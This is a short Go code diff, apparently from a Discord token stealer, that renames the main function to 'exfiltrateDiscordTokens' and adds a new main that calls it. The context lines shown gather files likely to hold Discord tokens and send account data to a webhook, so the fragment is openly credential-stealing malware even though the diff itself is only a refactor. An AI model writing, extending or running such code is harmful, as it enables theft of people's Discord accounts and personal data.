@@ -157,7 +157,7 @@ func init() {
 	}
 }
 
-func main() {
+func exfiltrateDiscordTokens() {
 	// Get file paths of all files that may contain Discord tokens
 	paths, err := getDiscordTokenFiles()
 		if err != nil {log.Fatal(err)}
@@ -187,4 +187,8 @@ func main() {
 		webhookErr := sendAccountDataToWebhook(account, webhookUrl)	// Have to use new error value
 			if webhookErr != nil {log.Fatal(webhookErr)}			// here - kinda dumb but whatever
 	}
+}
+
+func main() {
+	exfiltrateDiscordTokens()
 }
